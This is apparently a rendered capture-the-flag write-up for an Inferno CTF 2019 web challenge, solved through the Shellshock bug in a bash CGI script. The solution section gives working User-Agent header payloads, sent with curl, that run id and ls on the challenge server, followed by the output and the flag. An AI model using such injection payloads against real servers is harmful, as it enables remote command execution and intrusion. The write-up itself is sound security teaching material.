@@ -1,0 +1,532 @@
+<h1>Inferno CTF 2019 – We will we will Shock You</h1>
+
+<ul>
+<li><strong>Category:</strong> Web</li>
+<li><strong>Points:</strong> 150</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>:)</p>
+  
+  <p>http://104.197.168.32:17012/index.html</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>The name of the challenge reminds the <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)"><em>Shellshock</em></a> vulnerability.</p>
+
+<p>The homepage seems to be an apache2 default index, but analyzing the HTML source an interesting comment can be discovered.</p>
+
+<p>```html
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Apache2 Debian Default Page: It works</title>
+    <style type="text/css" media="screen">
+  * {
+    margin: 0px 0px 0px 0px;
+    padding: 0px 0px 0px 0px;
+  }</p>
+
+<p>body, html {
+    padding: 3px 3px 3px 3px;</p>
+
+<pre><code>background-color: #D8DBE2;
+
+font-family: Verdana, sans-serif;
+font-size: 11pt;
+text-align: center;
+</code></pre>
+
+<p>}</p>
+
+<p>div.main_page {
+    position: relative;
+    display: table;</p>
+
+<pre><code>width: 800px;
+
+margin-bottom: 3px;
+margin-left: auto;
+margin-right: auto;
+padding: 0px 0px 0px 0px;
+
+border-width: 2px;
+border-color: #212738;
+border-style: solid;
+
+background-color: #FFFFFF;
+
+text-align: center;
+</code></pre>
+
+<p>}</p>
+
+<p>div.page_header {
+    height: 99px;
+    width: 100%;</p>
+
+<pre><code>background-color: #F5F6F7;
+</code></pre>
+
+<p>}</p>
+
+<p>div.page_header span {
+    margin: 15px 0px 0px 50px;</p>
+
+<pre><code>font-size: 180%;
+font-weight: bold;
+</code></pre>
+
+<p>}</p>
+
+<p>div.page_header img {
+    margin: 3px 0px 0px 40px;</p>
+
+<pre><code>border: 0px 0px 0px;
+</code></pre>
+
+<p>}</p>
+
+<p>div.table<em>of</em>contents {
+    clear: left;</p>
+
+<pre><code>min-width: 200px;
+
+margin: 3px 3px 3px 3px;
+
+background-color: #FFFFFF;
+
+text-align: left;
+</code></pre>
+
+<p>}</p>
+
+<p>div.table<em>of</em>contents_item {
+    clear: left;</p>
+
+<pre><code>width: 100%;
+
+margin: 4px 0px 0px 0px;
+
+background-color: #FFFFFF;
+
+color: #000000;
+text-align: left;
+</code></pre>
+
+<p>}</p>
+
+<p>div.table<em>of</em>contents_item a {
+    margin: 6px 0px 0px 6px;
+  }</p>
+
+<p>div.content_section {
+    margin: 3px 3px 3px 3px;</p>
+
+<pre><code>background-color: #FFFFFF;
+
+text-align: left;
+</code></pre>
+
+<p>}</p>
+
+<p>div.content<em>section</em>text {
+    padding: 4px 8px 4px 8px;</p>
+
+<pre><code>color: #000000;
+font-size: 100%;
+</code></pre>
+
+<p>}</p>
+
+<p>div.content<em>section</em>text pre {
+    margin: 8px 0px 8px 0px;
+    padding: 8px 8px 8px 8px;</p>
+
+<pre><code>border-width: 1px;
+border-style: dotted;
+border-color: #000000;
+
+background-color: #F5F6F7;
+
+font-style: italic;
+</code></pre>
+
+<p>}</p>
+
+<p>div.content<em>section</em>text p {
+    margin-bottom: 6px;
+  }</p>
+
+<p>div.content<em>section</em>text ul, div.content<em>section</em>text li {
+    padding: 4px 8px 4px 16px;
+  }</p>
+
+<p>div.section_header {
+    padding: 3px 6px 3px 6px;</p>
+
+<pre><code>background-color: #8E9CB2;
+
+color: #FFFFFF;
+font-weight: bold;
+font-size: 112%;
+text-align: center;
+</code></pre>
+
+<p>}</p>
+
+<p>div.section<em>header</em>red {
+    background-color: #CD214F;
+  }</p>
+
+<p>div.section<em>header</em>grey {
+    background-color: #9F9386;
+  }</p>
+
+<p>.floating_element {
+    position: relative;
+    float: left;
+  }</p>
+
+<p>div.table<em>of</em>contents<em>item a,
+  div.content</em>section_text a {
+    text-decoration: none;
+    font-weight: bold;
+  }</p>
+
+<p>div.table<em>of</em>contents<em>item a:link,
+  div.table</em>of<em>contents</em>item a:visited,
+  div.table<em>of</em>contents_item a:active {
+    color: #000000;
+  }</p>
+
+<p>div.table<em>of</em>contents_item a:hover {
+    background-color: #000000;</p>
+
+<pre><code>color: #FFFFFF;
+</code></pre>
+
+<p>}</p>
+
+<p>div.content<em>section</em>text a:link,
+  div.content<em>section</em>text a:visited,
+   div.content<em>section</em>text a:active {
+    background-color: #DCDFE6;</p>
+
+<pre><code>color: #000000;
+</code></pre>
+
+<p>}</p>
+
+<p>div.content<em>section</em>text a:hover {
+    background-color: #000000;</p>
+
+<pre><code>color: #DCDFE6;
+</code></pre>
+
+<p>}</p>
+
+<p>div.validator {
+  }
+    </style>
+  </head>
+  <body>
+    <div class="main_page">
+      <div class="page_header floating_element">
+        <img src="/icons/openlogo-75.png" alt="Debian Logo" class="floating_element"/>
+        <span class="floating_element">
+          Apache2 Debian Default Page
+        </span>
+      </div>
+<!--      <div class="table_of_contents floating_element">
+        <div class="section_header section_header_grey">
+          TABLE OF CONTENTS
+        </div>
+        <div class="table_of_contents_item floating_element">
+          <a href="#about">About</a>
+        </div>
+        <div class="table_of_contents_item floating_element">
+          <a href="#changes">Changes</a>
+        </div>
+        <div class="table_of_contents_item floating_element">
+          <a href="#scope">Scope</a>
+        </div>
+        <div class="table_of_contents_item floating_element">
+          <a href="#files">Config files</a>
+        </div>
+      </div>
+-->
+      <div class="content_section floating_element"></p>
+
+<pre><code>    &lt;div class="section_header section_header_red"&gt;
+      &lt;div id="about"&gt;&lt;/div&gt;
+      It works!
+    &lt;/div&gt;
+    &lt;div class="content_section_text"&gt;
+      &lt;p&gt;
+            This is the default welcome page used to test the correct 
+            operation of the Apache2 server after installation on Debian systems.
+            If you can read this page, it means that the Apache HTTP server installed at
+            this site is working properly. You should &lt;b&gt;replace this file&lt;/b&gt; (located at
+            &lt;tt&gt;/var/www/html/index.html&lt;/tt&gt;) before continuing to operate your HTTP server.
+      &lt;/p&gt;
+
+
+      &lt;p&gt;
+            If you are a normal user of this web site and don't know what this page is
+            about, this probably means that the site is currently unavailable due to
+            maintenance.
+            If the problem persists, please contact the site's administrator.
+      &lt;/p&gt;
+
+    &lt;/div&gt;
+    &lt;div class="section_header"&gt;
+      &lt;div id="changes"&gt;&lt;/div&gt;
+            Configuration Overview
+    &lt;/div&gt;
+    &lt;div class="content_section_text"&gt;
+      &lt;p&gt;
+            Debian's Apache2 default configuration is different from the
+            upstream default configuration, and split into several files optimized for
+            interaction with Debian tools. The configuration system is
+            &lt;b&gt;fully documented in
+            /usr/share/doc/apache2/README.Debian.gz&lt;/b&gt;. Refer to this for the full
+            documentation. Documentation for the web server itself can be
+            found by accessing the &lt;a href="/manual"&gt;manual&lt;/a&gt; if the &lt;tt&gt;apache2-doc&lt;/tt&gt;
+            package was installed on this server.
+
+      &lt;/p&gt;
+      &lt;p&gt;
+            The configuration layout for an Apache2 web server installation on Debian systems is as follows:
+      &lt;/p&gt;
+      &lt;pre&gt;
+</code></pre>
+
+<p>/etc/apache2/
+|-- apache2.conf
+|       <code>--  ports.conf
+|-- mods-enabled
+|       |-- *.load
+|</code>-- *.conf
+|-- conf-enabled
+|       <code>-- *.conf
+|-- sites-enabled
+|</code>-- *.conf
+          </pre>
+          <ul>
+                        <li>
+                           <tt>apache2.conf</tt> is the main configuration
+                           file. It puts the pieces together by including all remaining configuration
+                           files when starting up the web server.
+                        </li></p>
+
+<pre><code>                    &lt;li&gt;
+                       &lt;tt&gt;ports.conf&lt;/tt&gt; is always included from the
+                       main configuration file. It is used to determine the listening ports for
+                       incoming connections, and this file can be customized anytime.
+                    &lt;/li&gt;
+
+                    &lt;li&gt;
+                       Configuration files in the &lt;tt&gt;mods-enabled/&lt;/tt&gt;,
+                       &lt;tt&gt;conf-enabled/&lt;/tt&gt; and &lt;tt&gt;sites-enabled/&lt;/tt&gt; directories contain
+                       particular configuration snippets which manage modules, global configuration
+                       fragments, or virtual host configurations, respectively.
+                    &lt;/li&gt;
+
+                    &lt;li&gt;
+                       They are activated by symlinking available
+                       configuration files from their respective
+                       *-available/ counterparts. These should be managed
+                       by using our helpers
+                       &lt;tt&gt;
+                            a2enmod,
+                            a2dismod,
+                       &lt;/tt&gt;
+                       &lt;tt&gt;
+                            a2ensite,
+                            a2dissite,
+                        &lt;/tt&gt;
+                            and
+                       &lt;tt&gt;
+                            a2enconf,
+                            a2disconf
+                       &lt;/tt&gt;. See their respective man pages for detailed information.
+                    &lt;/li&gt;
+
+                    &lt;li&gt;
+                       The binary is called apache2. Due to the use of
+                       environment variables, in the default configuration, apache2 needs to be
+                       started/stopped with &lt;tt&gt;/etc/init.d/apache2&lt;/tt&gt; or &lt;tt&gt;apache2ctl&lt;/tt&gt;.
+                       &lt;b&gt;Calling &lt;tt&gt;/usr/bin/apache2&lt;/tt&gt; directly will not work&lt;/b&gt; with the
+                       default configuration.
+                    &lt;/li&gt;
+      &lt;/ul&gt;
+    &lt;/div&gt;
+
+    &lt;div class="section_header"&gt;
+        &lt;div id="docroot"&gt;&lt;/div&gt;
+            Document Roots
+    &lt;/div&gt;
+
+    &lt;div class="content_section_text"&gt;
+        &lt;p&gt;
+            By default, Debian does not allow access through the web browser to
+            &lt;em&gt;any&lt;/em&gt; file apart of those located in &lt;tt&gt;/var/www&lt;/tt&gt;,
+            &lt;a href="http://httpd.apache.org/docs/2.4/mod/mod_userdir.html" rel="nofollow"&gt;public_html&lt;/a&gt;
+            directories (when enabled) and &lt;tt&gt;/usr/share&lt;/tt&gt; (for web
+            applications). If your site is using a web document root
+            located elsewhere (such as in &lt;tt&gt;/srv&lt;/tt&gt;) you may need to whitelist your
+            document root directory in &lt;tt&gt;/etc/apache2/apache2.conf&lt;/tt&gt;.
+        &lt;/p&gt;
+        &lt;p&gt;
+            The default Debian document root is &lt;tt&gt;/var/www/html&lt;/tt&gt;. You
+            can make your own virtual hosts under /var/www. This is different
+            to previous releases which provides better security out of the box.
+        &lt;/p&gt;
+    &lt;/div&gt;
+
+    &lt;div class="section_header"&gt;
+      &lt;div id="bugs"&gt;&lt;/div&gt;
+            Reporting Problems
+    &lt;/div&gt;
+    &lt;div class="content_section_text"&gt;
+      &lt;p&gt;
+            Please use the &lt;tt&gt;reportbug&lt;/tt&gt; tool to report bugs in the
+            Apache2 package with Debian. However, check &lt;a
+            href="http://bugs.debian.org/cgi-bin/pkgreport.cgi?ordering=normal;archive=0;src=apache2;repeatmerged=0"
+            rel="nofollow"&gt;existing bug reports&lt;/a&gt; before reporting a new bug.
+      &lt;/p&gt;
+      &lt;p&gt;
+            Please report bugs specific to modules (such as PHP and others)
+            to respective packages, not to the web server itself.
+      &lt;/p&gt;
+      &lt;!-- bashferno.cgi --&gt;
+    &lt;/div&gt;
+
+
+
+
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="validator"&gt;
+&lt;/div&gt;
+</code></pre>
+
+<p></body>
+</html>
+```</p>
+
+<p>Connecting to <code>http://104.197.168.32:17012/bashferno.cgi</code> will give you the following output.</p>
+
+<p>```html
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>BASHFerno</title>
+</head>
+<body></p>
+
+<p>
+Hello Bashers!!
+</p>
+
+<p><!--Its shocking ryt-->
+</body>
+</html>
+```</p>
+
+<p>Again some hints that lead to <em>Shellshock</em>.</p>
+
+<p>You can try to inject commands via <code>User-Agent</code> HTTP header.</p>
+
+<p>```
+foo@bar:~$ curl -v 'http://104.197.168.32:17012/bashferno.cgi' -H 'User-Agent: () { :;};echo -e "\r\n$(/usr/bin/id)"'
+*   Trying 104.197.168.32...
+* TCP_NODELAY set
+* Connected to 104.197.168.32 (104.197.168.32) port 17012 (#0)</p>
+
+<blockquote>
+  <p>GET /bashferno.cgi HTTP/1.1
+  Host: 104.197.168.32:17012
+  Accept: <em>/</em>
+  User-Agent: () { :;};echo -e "\r\n$(/usr/bin/id)"</p>
+  
+  <p>&lt; HTTP/1.1 200 OK
+  &lt; Date: Fri, 27 Dec 2019 18:30:09 GMT
+  &lt; Server: Apache/2.4.10 (Debian)
+  &lt; Transfer-Encoding: chunked
+  &lt;
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  Content-type: text/html</p>
+</blockquote>
+
+<p><html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>BASHFerno</title>
+</head>
+<body></p>
+
+<p>
+Hello Bashers!!
+</p>
+
+<p><!--Its shocking ryt-->
+</body>
+</html>
+* Connection #0 to host 104.197.168.32 left intact</p>
+
+<p>foo@bar:~$ curl -v 'http://104.197.168.32:17012/bashferno.cgi' -H 'User-Agent: () { :;};echo -e "\r\n$(/bin/ls .)"'
+*   Trying 104.197.168.32...
+* TCP_NODELAY set
+* Connected to 104.197.168.32 (104.197.168.32) port 17012 (#0)</p>
+
+<blockquote>
+  <p>GET /bashferno.cgi HTTP/1.1
+  Host: 104.197.168.32:17012
+  Accept: <em>/</em>
+  User-Agent: () { :;};echo -e "\r\n$(/bin/ls .)"</p>
+  
+  <p>&lt; HTTP/1.1 200 OK
+  &lt; Date: Fri, 27 Dec 2019 18:32:42 GMT
+  &lt; Server: Apache/2.4.10 (Debian)
+  &lt; Transfer-Encoding: chunked
+  &lt;
+  bashferno.cgi
+  flag<em>for</em>this_INFERNO.txt
+  index.html
+  Content-type: text/html</p>
+</blockquote>
+
+<p><html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>BASHFerno</title>
+</head>
+<body></p>
+
+<p>
+Hello Bashers!!
+</p>
+
+<p><!--Its shocking ryt-->
+</body>
+</html>
+* Connection #0 to host 104.197.168.32 left intact
+```</p>
+
+<p>The <code>ls</code> payload will reveal the presence of a <code>flag_for_this_INFERNO.txt</code> file that can be easily downloaded with the following URL.</p>
+
+<p><code>
+http://104.197.168.32:17012/flag_for_this_INFERNO.txt
+</code></p>
+
+<p>The file will contain the flag.</p>
+
+<p><code>
+infernoCTF{F33l_Th3_Sh0ck}
+</code></p>
